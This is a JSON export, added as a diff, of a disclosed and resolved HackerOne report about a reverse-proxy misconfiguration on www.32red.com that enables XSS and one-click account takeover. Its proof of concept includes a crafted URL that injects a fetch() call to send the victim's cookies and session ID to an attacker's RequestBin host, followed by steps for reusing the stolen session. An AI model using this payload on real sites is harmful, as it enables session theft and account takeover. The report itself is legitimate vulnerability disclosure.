@@ -1,0 +1,138 @@
+{
+  "id": 1632973,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjMyOTcz",
+  "url": "https://hackerone.com/reports/1632973",
+  "title": "[www.32red.com] Reverse proxy misconfiguration leads to 1-click account takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-10T20:22:49.182Z",
+  "submitted_at": "2022-07-10T20:22:49.242Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sw33tlie",
+    "url": "/sw33tlie",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/MWbuJTrLmDWrpvbB4b8otqwm/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 14047,
+    "url": "https://hackerone.com/kindred_group",
+    "handle": "kindred_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/047/30c5e0ecef105a2592f8b5a8a6102a5fae5bad0c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/047/30c5e0ecef105a2592f8b5a8a6102a5fae5bad0c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kindred Group",
+      "twitter_handle": "",
+      "website": "https://www.kindredgroup.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-04-03T13:15:01.401Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-04-03T13:15:01.271Z",
+  "team_member_agreed_on_going_public_at": "2023-04-03T09:23:18.531Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 111,
+  "voters": [
+    "ra5h",
+    "tiefps",
+    "monke",
+    "surya_ganesan_",
+    "shreyaschavhan",
+    "uneefa",
+    "n1m0",
+    "sw33tlie",
+    "ganeshbagaria",
+    "jamieparfet",
+    "and 101 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 60808,
+    "asset_type": "URL",
+    "asset_identifier": "www.32red.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 260369,
+      "category": "team",
+      "content": "==Below is the original, partially-redacted report==\n\n---------\n\nHi team,\n\n## Summary\n\nWe have found a misconfiguration in the reverse proxy powering www.32red.com, as it's possible to manipulate the forwarded requests using URL-encoded characters.\nThis leads to a full 1-click account takeover by injecting an XSS payload within a cookie at the reverse proxy layer, that's then forwarded to the backend and sent back to the victim's browser, where it fires.\nIt's possible to steal the session cookie `CAKEPHP` even if it has the httpOnly flag as it gets reflected in the HTML page, which can be accessed by javascript code.\n\nThis is not a straightforward bug, you can read more [in this blog post](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/) to understand this attack better.\n\n## PoC\n\nTo reproduce this vulnerability you'll need:\n- An account on www.32red.com (victim)\n- Being logged in on www.32red.com\n- A server that can log HTTP requests (Burp collaborator, or https://requestbin.io/)\n\n### Step 1\nPut your RequestBin hostname in the following URL (replace `-->REPLACE_URL_HERE<--`):\n```\nhttps://www.32red.com/%20HTTP/1.1%0aCookie:%20csrfToken=INJECTION'-fetch%2528'https:%2F%252-->REPLACE_URL_HERE<--',%7Bmethod:'POST',body:document.cookie%252B%22%5cu003bCAKEPHP=%22%252BRed.SessionId%7D%2529-'%0abin\n```\nNOTE: Remember to replace `https://` with `https:%2F%252F` as you can see above\n\n### Step 2\nVisit the URL you created while being logged in on `www.32red.com`\n\n### Step 3\nCheck the RequestBin endpoint, you'll find an inbound request.\nYou'll need to copy the POST data that was received, those are the cookies of the account (including the session cookie).\n\n██████████\n\n### Step 4\nPut the cookies you copied in your burp repeater tab and make a request to an API endpoint that requires authentication, this will confirm that you have full control over the account.\n\n███\n\nAs you can see from the image above, we retrieved the user's personal details. This is just an example to prove that we stole the victim's account.\nWe could definitely put the cookies directly into our browser gaining full access to the victim account.\n\nThis is the raw request that's in the image:\n```\nGET /account/getPlayerAccountDetails HTTP/2\nHost: www.32red.com\nUser-Agent: browser\nAccept: */*\nCookie: COOKIES_YOU_COPIED_HERE\n\n\n```\n\n## Impact\n\n- Full account takeover at www.32red.com\n- Cross-Site Scripting (XSS)\n- Potentially further attacks related to headers injection\n\nHope this helps, have a good day!",
+      "user": {
+        "id": 360834,
+        "username": "jamie-kg",
+        "name": "jamie",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2018-09-25T07:11:08.390Z",
+        "url": "https://hackerone.com/jamie-kg",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/360/834/c1b47af0e2412cede39db4703a8442600914f5d8_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/360/834/c1b47af0e2412cede39db4703a8442600914f5d8_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/360/834/c1b47af0e2412cede39db4703a8442600914f5d8_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
